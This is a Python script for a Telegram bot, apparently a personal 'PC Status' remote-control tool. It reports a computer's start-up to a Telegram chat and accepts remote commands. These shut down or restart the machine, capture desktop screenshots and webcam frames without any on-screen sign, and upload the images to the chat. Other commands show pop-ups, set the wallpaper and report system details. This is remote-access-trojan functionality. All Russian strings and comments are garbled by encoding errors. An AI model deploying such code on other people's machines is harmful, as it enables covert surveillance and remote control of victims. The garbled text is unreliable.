import os
import ctypes
import time
import requests
import cv2
import pyautogui
import platform
import telebot
from telebot import types
import config
import datetime
import colorama
import pyfiglet
import os
from colorama import Fore, Back, Style
import socket
import subprocess

hostname = socket.gethostname()
colorama.init()

# –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—É—â—É—é –¥–∞—Ç—É –∏ –≤—Ä–µ–º—è
now = datetime.datetime.now()
os.system('cls' if os.name == 'nt' else 'clear')
print(Fore.MAGENTA + pyfiglet.figlet_format('PC Status'))
print()
print(Fore.LIGHTBLACK_EX + '[!] ' + Fore.GREEN + '–î–∞–Ω–Ω—ã–µ –±—ã–ª–∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –∫ ' + Fore.YELLOW + 't.me/pcstatus_sefdirelaxbot')
print(Fore.LIGHTBLACK_EX + '[!] ' + Fore.GREEN + '–ú–æ–∂–Ω–æ –∑–∞–∫—Ä—ã–≤–∞—Ç—å –∫–æ–Ω—Å–æ–ª—å')

bot = telebot.TeleBot(config.TOKEN)

message_text = (
    "‚îå üñ• √ó –°—Ç–∞—Ç—É—Å –∫–æ–º–ø—å—é—Ç–µ—Ä–∞: `–í–∫–ª—é—á—ë–Ω`\n"
	#"‚îÇ \n"
	f"‚îî ‚òÑ √ó –ù–∞–∑–≤–∞–Ω–∏–µ –ü–ö: `{hostname}` \n"
	" \n"
	"üìÉ √ó –¢–∏–ø –æ—Ç–ø—Ä–∞–≤–∫–∏: `Shell Start Up`"
    " \n"
    f"‚è∞ √ó –í—Ä–µ–º—è –≤–∫–ª—é—á–µ–Ω–∏—è: `{now.strftime('%H:%M')}`\n"
	" \n"
	f"üìÖ √ó –î–∞—Ç–∞ –≤–∫–ª—é—á–µ–Ω–∏—è: `{now.strftime('%Y-%m-%d')}`"
	" \n"
)

keyboard = telebot.types.InlineKeyboardMarkup()
button = telebot.types.InlineKeyboardButton(text="–í—ã–∫–ª—é—á–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä", callback_data="shutdown_computer")
button2 = telebot.types.InlineKeyboardButton(text="–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä", callback_data="restart_computer")
status_bt = telebot.types.InlineKeyboardButton(text="–£–∑–Ω–∞—Ç—å —Å—Ç–∞—Ç—É—Å", callback_data="status_for_pc")
keyboard.add(button)
keyboard.add(button2)
keyboard.add(status_bt)
#keyboard.add(button, button2, status_bt)

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –Ω–∞–∂–∞—Ç–∏—è –Ω–∞ –∫–Ω–æ–ø–∫—É
# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –Ω–∞–∂–∞—Ç–∏—è –Ω–∞ –∫–Ω–æ–ø–∫—É
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == "shutdown_computer":
        subprocess.run("shutdown /s /t 1", shell=True)
        bot.send_message(call.message.chat.id, "‚îå üñ• √ó –°—Ç–∞—Ç—É—Å –∫–æ–º–ø—å—é—Ç–µ—Ä–∞: `–í—ã–∫–ª—é—á–µ–Ω–∏–µ`\n"
											   f"‚îî ‚òÑ √ó –ù–∞–∑–≤–∞–Ω–∏–µ –ü–ö: `{hostname}` \n"
											   " \n"
											   "üìÉ √ó –¢–∏–ø –æ—Ç–ø—Ä–∞–≤–∫–∏: `Console | Button`"
											   " \n"
											   f"‚è∞ √ó –í—Ä–µ–º—è –≤—ã–∫–ª—é—á–µ–Ω–∏—è: `{now.strftime('%H:%M')}`\n"
											   " \n"
											   f"üìÖ √ó –î–∞—Ç–∞ –≤—ã–∫–ª—é—á–µ–Ω–∏—è: `{now.strftime('%Y-%m-%d')}`"
											   " \n", parse_mode="Markdown")
    elif call.data == "restart_computer":
        subprocess.run("shutdown /r /t 1", shell=True)
        bot.send_message(call.message.chat.id, f"‚îå üñ• √ó –°—Ç–∞—Ç—É—Å –∫–æ–º–ø—å—é—Ç–µ—Ä–∞: `–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞`\n"
											   f"‚îî ‚òÑ √ó –ù–∞–∑–≤–∞–Ω–∏–µ –ü–ö: `{hostname}` \n"
											   f" \n"
											   f"üìÉ √ó –¢–∏–ø –æ—Ç–ø—Ä–∞–≤–∫–∏: `Console | Button`\n"
											   f"‚è∞ √ó –í—Ä–µ–º—è –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏: `{now.strftime('%H:%M')}`\n"
											   f"üìÖ √ó –î–∞—Ç–∞ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏: `{now.strftime('%Y-%m-%d')}`\n", parse_mode="Markdown")
    elif call.data == "status_for_pc":
        bot.send_message(call.message.chat.id, f"‚îå üñ• √ó –°—Ç–∞—Ç—É—Å –∫–æ–º–ø—å—é—Ç–µ—Ä–∞: `–í–∫–ª—é—á—ë–Ω`\n"
                                               f"‚îî ‚òÑ √ó –ù–∞–∑–≤–∞–Ω–∏–µ –ü–ö: `{hostname}` \n"
                                               f" \n"
                                               f"üìÉ √ó –¢–∏–ø –æ—Ç–ø—Ä–∞–≤–∫–∏: `–£–∑–Ω–∞—Ç—å —Å—Ç–∞—Ç—É—Å`\n"
                                               f"‚è∞ √ó –í—Ä–µ–º—è —Å—Ç–∞—Ç—É—Å–∞: `{now.strftime('%H:%M')}`\n"
                                               f"üìÖ √ó –î–∞—Ç–∞ —Å—Ç–∞—Ç—É—Å–∞: `{now.strftime('%Y-%m-%d')}`\n", parse_mode="Markdown")



bot.send_message(config.CHAT_ID, text=message_text, reply_markup=keyboard, parse_mode="Markdown")





#
#	rmk.row(*btns[0])
#	rmk.row(*btns[1])
#	bot.send_message(message.chat.id,
#		"""–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:
#		/ip - –ü–æ–ª—É—á–∏—Ç—å IP –∞–¥—Ä–µ—Å
#		/spec - –ü–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–∏—Å—Ç–µ–º–µ
#		/webcam - –ü–æ–ª—É—á–∏—Ç—å —Å–Ω–∏–º–æ–∫ —ç–∫—Ä–∞–Ω–∞
#		/message - –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ
#		/input - –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å—é –æ—Ç–≤–µ—Ç–∞
#		/wallpaper - –°–º–µ–Ω–∏—Ç—å –æ–±–æ–∏
#		/sct - –ü–æ–ª—É—á–∏—Ç—å —Å–Ω–∏–º–æ–∫ —ç–∫—Ä–∞–Ω–∞
#		""",
# )




@bot.message_handler(commands=["status", "status_pc"])
def status_pc(message):
	bot.send_message(message.chat.id, "–∫—É–∫—É–∫—É–∫—É")


@bot.message_handler(commands=["spec", "specifications"])
def specifications(message):
	banner = f"""
	–ù–∞–∑–≤–∞–Ω–∏–µ: {platform.node()}
	–ü—Ä–æ—Ü–µ—Å—Å–æ—Ä: {platform.processor()}
	–°–∏—Å—Ç–µ–º–∞: {platform.system()} {platform.release()}
	"""
	bot.send_message(message.chat.id, banner)


@bot.message_handler(commands=["sct", "screenshot"])
def screenshot(message):
	filename = f"{time.time()}.jpg"
	pyautogui.screenshot(filename)

	with open(filename, "rb") as img:
		bot.send_photo(message.chat.id, img)
	os.remove(filename)


@bot.message_handler(commands=["webcam"])
def webcam(message):
	filename = "cam.jpg"
	cap = cv2.VideoCapture(0)

	for i in range(30):
		cap.read()

	ret, frame = cap.read()

	cv2.imwrite(filename, frame)
	cap.release()

	with open(filename, "rb") as img:
		bot.send_photo(message.chat.id, img)
	os.remove(filename)


@bot.message_handler(commands=["message"])
def send_message_to_client(message):
	msg = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ:")
	bot.register_next_step_handler(msg, sms_to_client)


def sms_to_client(message):
	try:
		pyautogui.alert(message.text, "Message")
	except Exception:
		bot.send_message(message.chat.id, "–ß—Ç–æ-—Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫...")





@bot.message_handler(commands=["wallpaper"])
def wallpaper(message):
	msg = bot.send_message(message.chat.id, "–û—Ç–ø—Ä–∞–≤—å—Ç–µ –∫–∞—Ä—Ç–∏–Ω–∫—É:")
	bot.register_next_step_handler(msg, set_wallpaper)


@bot.message_handler(content_types=["photo"])
def set_wallpaper(message):
	file = message.photo[-1].file_id
	file = bot.get_file(file)

	download_file = bot.download_file(file.file_path)
	with open("image.jpg", "wb") as img:
		img.write(download_file)

	path = os.path.abspath("image.jpg")
	ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)


if __name__ == '__main__':
	bot.polling()